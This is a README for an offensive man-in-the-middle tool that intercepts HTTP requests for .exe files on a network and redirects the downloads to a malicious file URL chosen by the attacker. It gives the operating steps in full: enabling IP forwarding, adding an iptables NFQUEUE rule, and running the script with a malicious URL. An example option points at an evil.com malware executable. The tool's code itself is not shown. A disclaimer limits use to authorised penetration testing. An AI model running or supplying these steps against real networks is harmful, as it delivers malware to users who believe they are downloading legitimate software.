# :boom: HTTP File Replacement Tool

This tool intercepts HTTP requests for `.exe` files and replaces the download link with a malicious file URL of your choice.  

---

## ⚠ Disclaimer
This project is for **educational and penetration testing purposes only**.  
Do **NOT** use this tool on networks you do not own or have explicit permission to test.  
Unauthorized use is **illegal** and punishable by law.

---

## 🛠 Installation

1. Clone the repository:
```bash
git clone https://github.com/Nozarhi-1/download-changer.git
cd download-changer
```
---
## 📌 Features
    - Intercepts HTTP requests for `.exe` files
    - Redirects downloads to a malicious URL
    - Allows specifying the malicious file URL via **command-line arguments**
    - Can be adapted to replace other file types (e.g., `.zip`, `.pdf`)

---

## 🚀 Usage:

1. Enable IP forwarding:


        echo 1 > /proc/sys/net/ipv4/ip_forward

2. Set up iptables rules:

        sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

3. Run the script:

        sudo python file_replace.py -u "https://www.example/malicious.exe"

4. Restore firewall rules after finishing:

        sudo iptables --flush

---

📂 Command-Line Options

| Option         | Description                                 | Example                             |
| -------------- | ------------------------------------------- | ----------------------------------- |
| `-u` / `--url` | Malicious file URL to redirect downloads to | `-u "https://evil.com/malware.exe"` |




   
    
